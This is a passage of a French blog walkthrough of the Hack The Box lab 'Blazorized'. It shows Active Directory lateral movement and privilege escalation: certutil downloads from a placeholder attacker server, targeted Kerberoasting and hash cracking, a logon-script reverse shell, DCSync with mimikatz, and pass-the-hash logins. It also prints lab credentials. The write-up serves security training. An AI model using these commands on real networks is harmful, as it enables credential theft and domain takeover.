</code></pre><p><img src=/images/HTB-Blazorized/foothold.png alt="Meterpreter shell foothold"></p><p>Nous trouvons le drapeau utilisateur sur le bureau.</p><p><img src=/images/HTB-Blazorized/user_flag.png alt="user flag"></p><h3 id=mouvement-latéral-shell-en-tant-que-rsa_4810>Mouvement latéral (Shell en tant que RSA_4810)</h3><p>Habituellement, nous utilisons Bloodhound avec des identifiants afin de rassembler toutes les données relatives au domaine. Lorsque nous n&rsquo;avons pas accès à des informations d&rsquo;identification, nous pouvons utiliser <a href=https://github.com/BloodHoundAD/SharpHound>SharpHound</a> pour effectuer l&rsquo;énumération du domaine.</p><pre tabindex=0><code>certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/SharpHound.exe sharphound.exe
</code></pre><p><img src=/images/HTB-Blazorized/download_sharphound.png alt="SharpHound transfer"></p><p><img src=/images/HTB-Blazorized/sharhound_zip.png alt="SharpHound zip file"></p><p>Nous téléchargeons l&rsquo;archive <code>zip</code> sur notre machine locale, l&rsquo;extrayons et téléchargeons les fichiers dans Bloodhound.</p><p>Nous trouvons l&rsquo;utilisateur <code>NU_1055</code>, puis nous allons dans <code>Node Info</code> &ndash;> <code>First Degree Object Control</code> sous <code>OUTBOUND OBJECT CONTROL</code>. Nous découvrons que l&rsquo;utilisateur a le droit <code>WriteSPN</code> sur l&rsquo;utilisateur <code>RSA_4810</code>.</p><blockquote><p>Les SPN sont des identifiants utilisés par Kerberos pour associer un service à un compte particulier au sein de l&rsquo;Active Directory. Lorsqu&rsquo;un client demande l&rsquo;accès à un service (identifié par son SPN), il demande au contrôleur de domaine un ticket de service pour ce service. Pour notre attaque Kerberoast, nous demanderons un ticket de service pour le SPN spécifique que nous allons créer. Comme les tickets de service sont chiffrés avec le hachage NTLM du mot de passe du compte de service, après avoir obtenu ces tickets, nous pouvons essayer de craquer le hachage hors ligne afin de récupérer le mot de passe du compte de service.</p></blockquote><p><img src=/images/HTB-Blazorized/WriteSPN_Abuse.png alt="WriteSPN abuse"></p><ol><li>Transférez <code>PowerView.ps1</code> sur la cible.</li></ol><pre tabindex=0><code>certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/PowerView.ps1 powerview.ps1
</code></pre><p><img src=/images/HTB-Blazorized/powerview_transfer.png alt="PowerView file transfer"></p><ul><li>Passez à un prompt PowerShell et importez le module PowerView à l&rsquo;aide de la commande suivante</li></ul><pre tabindex=0><code>Import-Module ./powerview.ps1
</code></pre><ol start=2><li>Ajoutez un SPN arbitraire au compte de l&rsquo;utilisateur <code>RSA_4810</code>.</li></ol><pre tabindex=0><code>Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname=&#39;darryl/kscorpio&#39;}
</code></pre><ol start=3><li>Sollicitez un ticket Kerberos, recevez le hachage du mot de passe <code>RSA_4810</code> et craquez-le.</li></ol><pre tabindex=0><code>Get-DomainSPNTicket -SPN darryl/kscorpio 
</code></pre><blockquote><p>Vous devez supprimer tous les espaces blancs du hachage afin de l&rsquo;utiliser.</p></blockquote><p><img src=/images/HTB-Blazorized/targeted_kerberoasting.png alt="Targeted kerberoast attack"></p><p>Avec hashcat, nous récupérons le mot de passe <code>(Ni7856Do9854Ki05Ng0005 #)</code>.</p><pre tabindex=0><code>hashcat -m 13100 -a 0 RSA4810_hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src=/images/HTB-Blazorized/RSA_4810_pwd.png alt="RSA_4810 password"></p><p>Nous nous connectons sous le nom de <code>RSA_4810</code>.</p><pre tabindex=0><code>evil-winrm -u RSA_4810 -p &#34;(Ni7856Do9854Ki05Ng0005 #)&#34; -i blazorized.htb
</code></pre><p>Ce compte ne semble pas avoir de fichiers intéressants. En plus de <code>Administrator</code>, le seul autre utilisateur présent dans <code>C:\Users</code> est <code>SSA_6010</code>, nous devons probablement changer d&rsquo;utilisateur.</p><h3 id=mouvement-latéral-shell-en-tant-que-ssa_6010>Mouvement latéral (Shell en tant que SSA_6010)</h3><p>Enumérons les ACLs du domaine impliquant des permissions liées à l&rsquo;utilisateur <code>RSA_4810</code>.</p><pre tabindex=0><code>Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match &#34;rsa_4810&#34;}
</code></pre><p><img src=/images/HTB-Blazorized/write_scriptpath.png alt="ACL script-path information"></p><p>Il s&rsquo;avère que <code>RSA_4810</code> a la permission de modifier la propriété <code>Script-Path</code> de <code>SSA_6010</code>. Lorsque j&rsquo;essaie de rechercher le <code>scriptPath</code> spécifique de <code>SSA_6010</code>, le résultat est vide. Cela signifie probablement qu&rsquo;aucun script de connexion n&rsquo;est actuellement défini pour l&rsquo;utilisateur.</p><p><img src=/images/HTB-Blazorized/scriptPath_query.png alt="scriptPath query"></p><p>Le chemin vers ces scripts est généralement relatif à un partage de réseau désigné pour les scripts de connexion, comme le répertoire <code>SYSVOL</code>, il semble que nous devons manuellement localiser le répertoire et identifier le fichier que nous pouvons modifier. Son emplacement standard est <code>C:\Windows\SYSVOL</code>.</p><p>Dans <code>C:\Windows\SYSVOL\sysvol\blazorized.htb\scripts</code> nous découvrons que nous avons les permissions <code>Full</code> sur le répertoire <code>A32FF3AEAA23</code>.</p><p><img src=/images/HTB-Blazorized/SYSVOL_dir_perm.png alt="SYSVOL directory permissions"></p><ol><li>Nous définissons un script de connexion pour l&rsquo;utilisateur <code>SSA_6010</code>.</li></ol><pre tabindex=0><code>Set-ADUser -Identity SSA_6010 -ScriptPath &#39;A32FF3AEAA23\revshell.bat&#39; 
</code></pre><ol start=2><li>Nous plaçons un reverse shell PowerShell dans <code>revshell.bat</code>, qui sera automatiquement exécuté lorsque <code>SSA_6010</code> se connectera.</li></ol><ul><li>Nous pouvons obtenir un reverse shell PowerShell (<code>PowerShell#3 (Base64)</code>) sur <a href=https://www.revshells.com/>revshells.com</a>.</li></ul><pre tabindex=0><code> echo &#34;powershell -e JAB...&#34; | Out-File -FilePath C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23\revshell.bat -Encoding ASCII 
</code></pre><p><img src=/images/HTB-Blazorized/logon_script_revshell.png alt="Logon script revshell"></p><p>Sur notre listener, nous obtenons un shell sous le nom de <code>SSA_6010</code>.</p><p><img src=/images/HTB-Blazorized/SSA_6010_shell.png alt="SSA_6010 shell"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Nous passons à un shell meterpreter, téléchargeons SharpHound sur la cible et l&rsquo;exécutons une seconde fois.</p><p><code>SSA_6010</code> fait partie du groupe <code>Super_Support_Administrators</code>.</p><p><img src=/images/HTB-Blazorized/SSA_6010_group_membership.png alt="SSA_6010 group memberships"></p><p>Les membres de ce groupe ont le droit <code>DCSync</code> sur le contrôleur de domaine. Nous pouvons utiliser ce droit pour réaliser une attaque DCSync et obtenir le hachage du mot de passe de l&rsquo;administrateur.</p><blockquote><p>Le droit DCSync est une autorisation généralement accordée aux contrôleurs de domaine dans un environnement AD. Il est utilisé pour répliquer les informations de l&rsquo;annuaire, y compris les informations d&rsquo;identification des comptes, à travers le domaine. Lorsqu&rsquo;un serveur dispose de ce droit, il peut effectuer des opérations de synchronisation d&rsquo;annuaire pour maintenir la cohérence des données entre différents contrôleurs de domaine. Avec ce droit, nous pouvons prétendre être un contrôleur de domaine en envoyant une requête <code>DRSGetNCChanges</code> au contrôleur de domaine cible et quand celui-ci répond, il nous renvoie des informations sensibles, y compris les hachages de mots de passe pour les comptes demandés.</p></blockquote><p><img src=/images/HTB-Blazorized/DCSync_abuse.png alt="DCSync Abuse"></p><pre tabindex=0><code>certutil.exe -urlcache -split -f http://YOUR-IP:WEBSERVER_PORT/mimikatz.exe mimikatz.exe
</code></pre><p>Exécutez mimikatz avec <code>.\mimikatz.exe</code> et pour obtenir le hachage de l&rsquo;administrateur, exécutez la commande suivante.</p><pre tabindex=0><code>lsadump::dcsync /domain:blazorized.htb /user:administrator
</code></pre><p><img src=/images/HTB-Blazorized/admin-hash.png alt="admin password hash"></p><p>Enfin, nous nous connectons en tant que l&rsquo;<code>Administrateur</code>avec le hash, et lisons le drapeau root.</p><pre tabindex=0><code> evil-winrm -i 10.10.11.22 -u Administrator -H &#34;f55ed1465179ba374ec1cad05b34a5f3&#34; 
</code></pre><p><img src=/images/HTB-Blazorized/root_flag.png alt="Root flag"></p><p>Vous trouverez ci-dessous quelques références qui m&rsquo;ont été utiles. Je vous remercie d&rsquo;avoir lu cet article et j&rsquo;espère qu&rsquo;il vous a été utile.</p><ul><li><a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync>HackTricks - DCSync</a></li><li><a href=https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/>SPN-jacking</a></li><li><a href="https://learn.microsoft.com/en-us/aspnet/core/blazor/host-and-deploy/webassembly-caching/?view=aspnetcore-8.0">ASP.NET Core Blazor WebAssembly .NET runtime and app bundle caching</a></li><li><a href=https://github.com/dotnet/AspNetCore.Docs/blob/main/aspnetcore/blazor/project-structure.md#blazor-web-app>Blazor Web App structure</a></li></ul></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-editorial/>&#8592;
Précédent:
HTB: Editorial</a></p><p class=prev-post-date>octobre 16, 2024</p></div><div class=next-post><p><a href=/fr/posts/htb-axlle/>Suivant:
HTB: Axlle
&#8594;</a></p><p class=next-post-date>novembre 15, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès initial</a><ul><li><a href=#mouvement-latéral-shell-en-tant-que-rsa_4810>Mouvement latéral (Shell en tant que RSA_4810)</a></li><li><a href=#mouvement-latéral-shell-en-tant-que-ssa_6010>Mouvement latéral (Shell en tant que SSA_6010)</a></li></ul></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>